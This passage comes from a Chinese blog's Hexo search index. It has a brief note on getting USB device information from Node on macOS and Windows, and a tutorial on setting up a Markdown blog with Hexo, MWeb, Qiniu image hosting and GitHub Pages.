    <content type="text"><![CDATA[Node获取Usb信息MacOS获取Usb相关资料如果已经安装 lsusb 可以使用lsusb获取没有則使用 system_profiler SPUSBDataType Windows可以通过 Wmic获取]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>Electron</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于MarkDown的博客系统搭建]]></title>
    <url>%2F2018%2F05%2F21%2F%E5%85%B6%E5%AE%83%2F20180521%2F</url>
    <content type="text"><![CDATA[纯粹的文章编写,使用到GitPage,Hexo,MWeb,七牛做图床 注册七牛云账号七牛官网 创建”对象存储” 个人中心获取密钥 安装MWebMWeb官网 Mweb界面: 打开设置界面 填入密钥 完成后就可以上传图片了,图片访问需要一个固定域名,创建时七牛云给一个临时的域名可以使用一个月. 使用”外部模式” 快捷键⌘+E点 “+”号引入 配置项目 因为MWeb在外部模式才支持,图片url替换,正常模式需要手工上传粘贴url 安装Hexo参照官网Hexo官网安装1npm install -g hexo-cli 安装完成,可以在命令行下使用. 新建项目123hexo init &lt;folder&gt;cd &lt;folder&gt;npm install 创建完如下: 新建文章1hexo new 文章名 打开,如图结构 运行预览服务1hexo s 找开网址,便能看到Blog界面 配置GitHubPage注册GitHub,略新建GitHubPagehttps://pages.github.com/创建一个git仓库,名字如下,xxx.github.io就可以使用xxx.github.io访问了 复制仓库地址,配置hexo如:https://github.com/arkin-j/arkin-j.github.io.git 配置发布在刚创建的目录下,修改_config.yml文件1vim _config.yml 具体查看帮助 https://hexo.io/docs/deployment如 创建完文章,便可以使用命令发布了,需要在项目目录下执行. 1hexo clean &amp;&amp; hexo deploy 然后再访问刚才创建的gitpage如:https://arkin-j.github.io/ 就可以看到新的文章了.如下: 模板在项目目录下,可以修改,也可以使用别人现在的. 完 &gt;&gt;&gt;]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>初始化</tag>
        <tag>Hexo</tag>
        <tag>MWeb</tag>
        <tag>GitPage</tag>
      </tags>
  </entry>
</search>
